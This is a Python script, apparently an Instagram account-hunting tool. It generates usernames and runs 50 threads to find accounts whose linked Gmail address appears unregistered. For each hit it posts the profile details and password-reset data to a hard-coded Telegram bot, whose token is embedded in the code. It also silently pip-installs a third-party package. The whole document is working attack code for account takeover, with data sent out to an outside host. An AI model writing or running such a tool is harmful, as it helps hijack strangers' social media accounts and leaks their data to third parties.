import os,sys
from threading import Thread as HSO
try: 
    from instagramtolle import GMAIL,instagram
except ImportError:
    os.system("pip install instagramtolle==0.3")
try:
    import requests
except ImportError:
    os.system("pip install requests")
ge,be,gi,bi=0,0,0,0
idf="7016098393"
tokf="7006210929:AAGhfsURXG1lg6mDpt2NKRE8HysZLWu9WIg"
os.system('clear')
R="\033[1;31m" # Red
G="\033[1;32m" # Green
Y="\033[1;33m" # Yellow
Bl="\033[1;34m" # Blue
W="\033[1;37m" # White
def info(email):
    global idf,tokf
    user=email.split("@")[0]
    if "@"not in email:email=email+"@gmail.com"
    try:
        a=instagram.info(user)
        data=a.get("data")
        id_t=data.get("id")
        nm=data.get("full_name")
        prv=data.get("is_private")
        pos=data.get("post")
        fol=data.get("followers")
        folg=data.get("following")
        prpg=data.get("programer")
        tlg=str(f''' 
𝙜𝙢𝙖𝙞𝙡 :{email}
𝙧𝙚𝙨𝙚𝙩 : {instagram.Reset(user).get("data").get("reset")}
𝙣𝙖𝙢𝙚 : {nm}
𝙪𝙨𝙚𝙧𝙣𝙖𝙢𝙚 {user}
𝙛𝙤𝙡𝙡𝙤𝙬𝙞𝙣𝙜 : {folg}
𝙛𝙤𝙡𝙡𝙤𝙬𝙚𝙧𝙨 : {fol}
𝙞𝙙 : {id_t}
𝙥𝙧𝙞𝙫𝙖𝙩𝙚 : {prv}
𝙥𝙤𝙨𝙩 : {pos}
𝙙𝙖𝙩𝙚 : {instagram.GetData(id_t).get("message").get("data")}
𝘱𝘳𝘰𝘨𝘳𝘢𝘮𝘮𝘦𝘳..@ebn_elnegm
    ''')
    except:
        tlg=str(f''' 
𝙜𝙢𝙖𝙞𝙡 :{email}
𝙧𝙚𝙨𝙚𝙩 : {instagram.Reset(user).get("data").get("reset")}
𝙪𝙨𝙚𝙧𝙣𝙖𝙢𝙚 {user}
𝘱𝘳𝘰𝘨𝘳𝘢𝘮𝘮𝘦𝘳..
''')
    requests.post(f"https://api.telegram.org/bot{tokf}/sendMessage?chat_id={idf}&text=" + str(tlg))
def ch(email):
    global ge,be,gi,bi
    try:
        b=instagram.CheckEmail(email).get("data").get("status")
        if b==True:
            gi+=1
            c=GMAIL.CheckEmail(email).get("data").get("status")
            if c==True:
                ge+=1
                info(email)
            elif c==False:
                be+=1
        elif b==False:
            bi+=1
        sys.stdout.write(f'''\r{G}Hits : {W}{ge}{R} | Bad IN: {W}{bi}{Y} |Bad EM : {W}{be}{Bl} | Good IN : {W}{gi}'''),sys.stdout.flush()
    except:
        print("run vpn ...")
def h():
    while True:
        try:
            a=instagram.generateUsername2013()
            user=a["data"]["username"]
            if not "None"in user:
                email=user+"@gmail.com"
                ch(email)
            else:
                h()
        except:
            continue
for i in range(50):
    HSO(target=h).start()
